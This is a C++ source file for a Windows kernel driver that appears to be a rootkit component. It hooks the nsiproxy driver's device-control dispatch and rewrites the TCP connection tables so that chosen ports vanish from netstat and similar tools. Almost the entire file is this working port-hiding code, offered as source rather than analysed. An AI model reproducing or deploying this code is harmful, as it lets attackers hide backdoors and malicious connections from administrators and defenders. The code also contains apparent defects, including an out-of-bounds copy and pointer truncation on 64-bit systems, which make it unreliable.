#include "hide_port.h"

PDRIVER_OBJECT NetHook::pNsi_driver_object = nullptr;
PDRIVER_DISPATCH NetHook::original_nsi_device_io = nullptr;
vector<USHORT>* NetHook::hidden_ports = nullptr;

USHORT NetHook::htons(USHORT a)
{
	USHORT b = a;
	b = (b << 8);
	a = (a >> 8);
	return (a | b);
}

NTSTATUS NetHook::hookedCompletion(
	IN PDEVICE_OBJECT  DeviceObject,
	IN PIRP  Irp,
	IN PVOID  Context
)
{
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION next_irp_loc = IoGetNextIrpStackLocation(Irp);
	PHP_CONTEXT pCtx = static_cast<PHP_CONTEXT>(Context);
	PNSI_PARAM nsi_param;
	int i;

	if (NT_SUCCESS(Irp->IoStatus.Status))
	{

		nsi_param = static_cast<PNSI_PARAM>(Irp->UserBuffer);
		if (MmIsAddressValid(nsi_param->lpMem))
		{

			// netstat will involve internal calls which will use 
			// nsi_param structure
			if ((nsi_param->UnknownParam8 == 0x38))
			{
				KAPC_STATE apc_state;
				PNSI_STATUS_ENTRY pStatusEntry = static_cast<PNSI_STATUS_ENTRY>(nsi_param->lpStatus);
				PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = static_cast<PINTERNAL_TCP_TABLE_ENTRY>(nsi_param->lpMem);
				int item_count = nsi_param->TcpConnCount;


				KeStackAttachProcess(pCtx->pcb, &apc_state);


				//make sure we are in the context of original process
				for (i = 0; i < item_count; i++)
				{

					if (hidden_ports->exists(pTcpEntry[i].localEntry.Port))
					{

						//NSI will map status array entry to tcp table array entry
						//we must modify both synchronously
						RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (item_count - i));
						RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (item_count - i));
						item_count--;
						nsi_param->TcpConnCount--;
						i--;



					}
				}

				KeUnstackDetachProcess(&apc_state);

			}


		}

	}

	next_irp_loc->Context = pCtx->oldCtx;
	next_irp_loc->CompletionRoutine = pCtx->oldIocomplete;


	if (pCtx->bShouldInvolve)
		status = next_irp_loc->CompletionRoutine(DeviceObject, Irp, Context);
	else if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	//free the fake context
	ExFreePool(Context);

	return status;


}

NTSTATUS NetHook::hookedDeviceIoControl(
	IN PDEVICE_OBJECT  DeviceObject,
	IN PIRP  Irp
)
{
	ULONG         io_control_code;
	PIO_STACK_LOCATION irp_stack;
	ULONG		  status;

	irp_stack = IoGetCurrentIrpStackLocation(Irp);

	io_control_code = irp_stack->Parameters.DeviceIoControl.IoControlCode;

	if (IOCTL_NSI_GETALLPARAM == io_control_code)
	{
		if (irp_stack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			//if call is relevent hook the CompletionRoutine
			PHP_CONTEXT ctx = static_cast<HP_CONTEXT*>(ExAllocatePool(NonPagedPool, sizeof(HP_CONTEXT)));
			ctx->oldIocomplete = irp_stack->CompletionRoutine;
			ctx->oldCtx = irp_stack->Context;
			irp_stack->CompletionRoutine = hookedCompletion;
			irp_stack->Context = ctx;
			ctx->pcb = IoGetCurrentProcess();

			if ((irp_stack->Control & SL_INVOKE_ON_SUCCESS) == SL_INVOKE_ON_SUCCESS)
				ctx->bShouldInvolve = TRUE;
			else
				ctx->bShouldInvolve = FALSE;
			irp_stack->Control |= SL_INVOKE_ON_SUCCESS;


		}



	}

	//call the original DeviceIoControl func
	status = original_nsi_device_io(DeviceObject, Irp);

	return status;

}


NTSTATUS NetHook::initNsiHook() {

	NTSTATUS status;
	UNICODE_STRING nsi_driver_name;


	RtlInitUnicodeString(&nsi_driver_name, L"\\Driver\\nsiproxy");

	status = ObReferenceObjectByName(&nsi_driver_name, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&pNsi_driver_object);

	if (!NT_SUCCESS(status))
	{
		KdPrint(("Port_Hide: Failed to find nsiproxy (0x%08X)\n", status));
		return STATUS_SUCCESS;

	}

	//initialize global ptr to hidden ports vector
	hidden_ports = new vector<USHORT>;

	//save the original device control function of the nsiproxy driver
	original_nsi_device_io = pNsi_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	//perform IRP hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsi_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(hookedDeviceIoControl));

	return status;
}

void NetHook::unhookNsiProxy() {

	//undo hook
	InterlockedExchange(reinterpret_cast<PLONG>(&(pNsi_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG>(original_nsi_device_io));
	KdPrint(("Port_Hide: original DeviceControl func restored \n"));
	
	//decrease reference count of hooked driver
	ObDereferenceObject(pNsi_driver_object);
	
	//sleep after removing IRP hooks
	//to make sure all handlers are done
	LARGE_INTEGER wait_time;
	wait_time.QuadPart = -50 * 1000 * 1000;
	KeDelayExecutionThread(KernelMode, 0, &wait_time);

	//free the hidden ports vector
	delete hidden_ports;
}
